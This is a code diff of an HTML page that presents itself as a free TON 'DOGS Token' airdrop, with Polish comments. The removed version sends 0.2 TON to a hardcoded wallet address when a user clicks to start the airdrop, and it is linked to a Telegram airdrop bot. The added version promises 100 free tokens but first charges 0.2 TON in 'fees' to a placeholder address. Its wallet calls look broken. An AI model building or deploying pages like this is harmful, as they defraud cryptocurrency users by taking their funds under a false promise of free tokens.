@@ -1,56 +1,147 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Connect Example</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/@tonconnect/sdk@0.0.34/dist/tonconnect-sdk.min.js"></script>
-
+    <title>DOGS Token Airdrop</title>
+    <script src="https://cdn.jsdelivr.net/npm/ton3-core@latest/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonweb@latest/dist/tonweb.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 0;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .status {
+            margin: 20px 0;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .success {
+            background-color: #dff0d8;
+            color: #3c763d;
+        }
+        .error {
+            background-color: #f2dede;
+            color: #a94442;
+        }
+        .wallet-info {
+            margin: 20px 0;
+            padding: 10px;
+            background-color: #e8f5e9;
+            border-radius: 5px;
+        }
+    </style>
 </head>
-
 <body>
-    <div class="center" id="ton-connect"></div>
-    <button id="start-airdrop" style="">Rozpocznij Airdrop</button>
+    <div class="container">
+        <h1>🐕 DOGS Token Airdrop</h1>
+        
+        <div class="wallet-info" id="walletInfo">
+            <p>Connected Wallet: <span id="walletAddress">Not connected</span></p>
+            <p>Balance: <span id="walletBalance">0 TON</span></p>
+        </div>
+
+        <button id="connectWallet">Connect Wallet</button>
+        <button id="claimAirdrop" disabled>Claim 100 DOGS Tokens</button>
+
+        <div id="status" class="status"></div>
+    </div>
 
     <script>
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect'
-        });
-        tonConnectUI.uiOptions = {
-            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-        };
+        const AIRDROP_ADDRESS = 'YOUR_AIRDROP_CONTRACT_ADDRESS'; // Adres twojego kontraktu
+        let wallet = null;
 
-        const startAirdropButton = document.getElementById('start-airdrop');
-
-
-        startAirdropButton.addEventListener('click', async () => {
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
-                messages: [
-                    {
-                        address: "EQAj2hi6_JljnyupUJqqWduHyQ_74Uf23FcVQmdXy9KWVnQY",
-                        amount: "200000000",
-                        // stateInit: "base64bocblahblahblah==" // just for instance. Replace with your transaction initState or remove
-                    }
-                ]
-            }
-
+        async function connectWallet() {
             try {
-                const result = await tonConnectUI.sendTransaction(transaction);
+                // Sprawdź czy TON Wallet jest zainstalowany
+                if (!window.tonConnectUI) {
+                    throw new Error('TON Wallet not found! Please install TON Wallet extension.');
+                }
 
-                // you can use signed boc to find the transaction 
-                const someTxData = await myAppExplorerService.getTransaction(result.boc);
-                alert('Transaction was sent successfully', someTxData);
-            } catch (e) {
-                console.error(e);
+                // Połącz z portfelem
+                const provider = window.tonConnectUI;
+                await provider.requestWallets();
+                
+                wallet = await provider.getWallets();
+                if (wallet && wallet.length > 0) {
+                    document.getElementById('walletAddress').textContent = 
+                        `${wallet[0].address.slice(0,6)}...${wallet[0].address.slice(-4)}`;
+                    document.getElementById('claimAirdrop').disabled = false;
+                    
+                    // Pobierz i wyświetl saldo
+                    const balance = await provider.getBalance(wallet[0].address);
+                    document.getElementById('walletBalance').textContent = `${balance} TON`;
+                    
+                    showStatus('Wallet connected successfully!', 'success');
+                }
+            } catch (error) {
+                showStatus(error.message, 'error');
             }
+        }
 
+        async function claimAirdrop() {
+            try {
+                if (!wallet) {
+                    throw new Error('Please connect your wallet first!');
+                }
 
-        });
+                // Przygotuj transakcję
+                const transaction = {
+                    to: AIRDROP_ADDRESS,
+                    value: '0.2', // 0.2 TON na opłaty
+                    data: 'claim'
+                };
+
+                // Wyślij transakcję
+                const provider = window.tonConnectUI;
+                const result = await provider.sendTransaction(transaction);
+
+                if (result) {
+                    showStatus('Airdrop claimed successfully! Check your wallet for DOGS tokens.', 'success');
+                }
+            } catch (error) {
+                showStatus(error.message, 'error');
+            }
+        }
+
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+        }
+
+        // Dodaj event listenery
+        document.getElementById('connectWallet').addEventListener('click', connectWallet);
+        document.getElementById('claimAirdrop').addEventListener('click', claimAirdrop);
     </script>
-</body>
 
+    <!-- TON Connect UI -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+</body>
 </html>
